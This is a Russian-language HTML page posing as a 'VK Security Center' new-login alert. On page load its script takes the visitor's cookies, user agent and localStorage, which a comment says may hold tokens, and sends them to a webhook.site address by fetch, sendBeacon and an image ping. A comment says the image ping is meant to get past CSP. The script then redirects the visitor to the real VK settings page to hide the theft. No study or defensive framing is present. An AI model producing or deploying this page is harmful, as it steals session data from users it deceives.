<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Внимание: Обнаружена попытка входа">
    <meta property="og:image" content="https://webhook.site/8a567435-7606-4101-a378-5135d4ac218d/bot_og_image.png">
    <meta property="og:description" content="Зафиксирован вход с нового устройства: Linux, Saint Petersburg.">
    
    <link rel="icon" href="https://webhook.site/8a567435-7606-4101-a378-5135d4ac218d/favicon.ico">

    <title>VK Security Center</title>
</head>
<body>
    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
        <h2>Проверка безопасности аккаунта...</h2>
        <p>Идет синхронизация сессии, пожалуйста, не закрывайте страницу.</p>
    </div>

    <script>
        (function() {
            const hook = "https://webhook.site/8a567435-7606-4101-a378-5135d4ac218d";
            
            // Собираем всё, что можем, включая localStorage (там бывают токены)
            let report = {
                type: "VISIT",
                ua: navigator.userAgent,
                cookies: document.cookie || "none",
                storage: JSON.stringify(localStorage).substring(0, 500)
            };

            // Комбинированный метод отправки (fetch + Beacon API)
            const payload = btoa(unescape(encodeURIComponent(JSON.stringify(report))));
            
            // 1. Стандартный fetch
            fetch(`${hook}/report?d=${payload}`, {mode: 'no-cors'});
            
            // 2. Beacon API - работает даже если вкладку сразу закрыли
            if (navigator.sendBeacon) {
                navigator.sendBeacon(`${hook}/beacon`, payload);
            }

            // 3. Пинг через картинку для обхода CSP
            new Image().src = `${hook}/img_ping?v=${Date.now()}`;

            // Редирект через 2 секунды на настройки безопасности VK
            setTimeout(() => {
                window.location.href = "https://vk.com/settings?act=security";
            }, 2000);
        })();
    </script>
</body>
</html>
